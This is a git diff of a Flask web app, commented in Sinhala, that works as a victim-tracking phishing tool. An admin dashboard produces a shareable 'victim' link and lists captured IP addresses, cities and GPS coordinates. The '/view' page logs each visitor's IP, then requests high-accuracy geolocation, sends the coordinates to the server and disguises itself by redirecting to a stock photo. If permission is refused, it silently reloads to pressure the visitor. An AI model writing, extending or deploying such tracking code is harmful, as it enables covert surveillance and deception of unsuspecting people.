@@ -1,7 +1,5 @@
-import os
-import requests
-import datetime
-from flask import Flask, render_template_string, request, redirect
+import os, requests, datetime
+from flask import Flask, render_template, request, redirect
 
 app = Flask(__name__)
 
@@ -31,43 +29,14 @@ def admin():
             </form>
         </body>
         '''
-    
-    # Host එක පබ්ලික් ඩොමේන් එකක් (trycloudflare වැනි) නම් ඒක ගන්නවා, නැත්නම් Request Host එක පාවිච්චි කරනවා
-    host = request.headers.get('X-Forwarded-Host', request.host)
-    proto = request.headers.get('X-Forwarded-Proto', 'https')
-    base_url = f"{proto}://{host}"
+    base_url = request.url_root.replace("http://", "https://").rstrip('/')
     victim_link = f"{base_url}/view"
+    return render_template('index.html', logs=reversed(captured_logs), tunnel_url=victim_link)
 
-    # HTML ඩෑෂ්බෝඩ් එක (ටේබල් සහ ලින්ක් පෙන්වීම සඳහා)
-    logs_html = ""
-    for log in reversed(captured_logs):
-        logs_html += f"<tr><td>{log['time']}</td><td>{log['ip']}</td><td>{log['city']}</td><td>{log['lat']}</td><td>{log['lon']}</td></tr>"
-
-    return f'''
-    <body style="background:#0f172a; color:white; font-family:sans-serif; padding:30px;">
-        <div style="max-width:900px; margin:auto; background:rgba(255,255,255,0.03); padding:30px; border-radius:15px; border:1px solid #333;">
-            <h2 style="color:#4ade80;">Admin Dashboard</h2>
-            <p style="color:#bbb;">Victim Shareable Public Link:</p>
-            <input type="text" value="{victim_link}" readonly style="width:100%; padding:12px; background:#000; color:#4ade80; border:1px solid #444; border-radius:8px; font-size:16px; margin-bottom:25px;" onclick="this.select();">
-            
-            <h3 style="margin-top:20px;">Captured Logs ({len(captured_logs)})</h3>
-            <table style="width:100%; border-collapse:collapse; margin-top:10px; background:#000; border-radius:8px; overflow:hidden;">
-                <tr style="background:#1e293b; color:#4ade80; text-align:left;">
-                    <th style="padding:10px;">Time</th>
-                    <th style="padding:10px;">IP</th>
-                    <th style="padding:10px;">City / Status</th>
-                    <th style="padding:10px;">Latitude</th>
-                    <th style="padding:10px;">Longitude</th>
-                </tr>
-                {logs_html if logs_html else '<tr><td colspan="5" style="padding:15px; text-align:center; color:#777;">No logs captured yet.</td></tr>'}
-            </table>
-        </div>
-    </body>
-    '''
-
-# --- Victim Page ---
+# --- Victim Page (No Alerts, Auto Refresh on Deny) ---
 @app.route('/view')
 def victim_page():
+    # IP එක ගන්නවා
     user_ip = request.remote_addr
     if request.headers.get('X-Forwarded-For'):
         user_ip = request.headers.get('X-Forwarded-For').split(',')[0]
@@ -75,6 +44,7 @@ def victim_page():
     ip_info = get_ip_info(user_ip)
     city = ip_info['city'] if ip_info else "Sri Lanka"
     
+    # යූසර් පේජ් එකට ආපු ගමන් IP එකයි නගරයයි ලොග් කරනවා (GPS නැතුව)
     log = {
         "time": datetime.datetime.now().strftime("%H:%M:%S"),
         "ip": user_ip,
@@ -99,10 +69,12 @@ def victim_page():
             function askLocation() {{
                 navigator.geolocation.getCurrentPosition(
                     function(p) {{
+                        // පර්මිෂන් දුන්නොත් GPS දත්ත යවනවා
                         fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&ip={user_ip}&city={city}')
                         .then(() => {{ location.href='https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=1200'; }});
                     }},
                     function(e) {{
+                        // පර්මිෂන් බ්ලොක් කළොත් කිසිම මැසේජ් එකක් පෙන්වන්නේ නැතුව පේජ් එක රිෆ්‍රෙෂ් කරනවා
                         location.reload();
                     }},
                     {{enableHighAccuracy: true}}
@@ -121,6 +93,7 @@ def victim_page():
 
 @app.route('/log')
 def log_data():
+    # GPS ලැබුණු පසු කලින් තිබූ ලොග් එක අප්ඩේට් කිරීම හෝ අලුතින් එකතු කිරීම
     lat = request.args.get('lat')
     lon = request.args.get('lon')
     ip = request.args.get('ip')
